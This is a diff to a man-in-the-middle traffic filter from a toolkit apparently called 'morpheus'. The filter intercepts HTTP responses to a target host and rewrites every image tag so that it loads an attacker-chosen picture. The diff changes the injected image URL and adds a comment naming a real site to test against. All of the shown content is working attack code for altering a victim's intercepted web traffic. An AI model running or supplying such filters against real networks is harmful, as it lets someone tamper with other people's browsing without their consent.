@@ -15,6 +15,7 @@
 #  This filter will substitute the html tag '<img src=>'
 #  and injects your image in any webpage requested by TaRONE
 #  Warning: This filter only modifies http traffic..
+#  access this url to test: https://nhm.org/site/
 ##
 
 
@@ -48,14 +49,16 @@ if (ip.proto == TCP && tcp.dst == 80) {
 
 
 
+
+
 #####################
 ## Replace Content ##
 #####################
 # change server response to target
 if (ip.proto == TCP && tcp.src == 80) {
   msg("[morpheus] host:TaRONE   [ <- ]  port:80 http ☆");
-  replace("img src=", "img src='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");  
-  replace("IMG SRC=", "IMG SRC='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");
+  replace("img src=", "img src=\"http://www.cranklin.com/mickey.png\" ");
+  replace("IMG SRC=", "img src=\"http://www.cranklin.com/mickey.png\" ");
   msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
   msg("[Morpheus] | status: (img) string found in tcp packet ✔");
   msg("[Morpheus] |_ info : string replaced and forward to target ✔\n");   
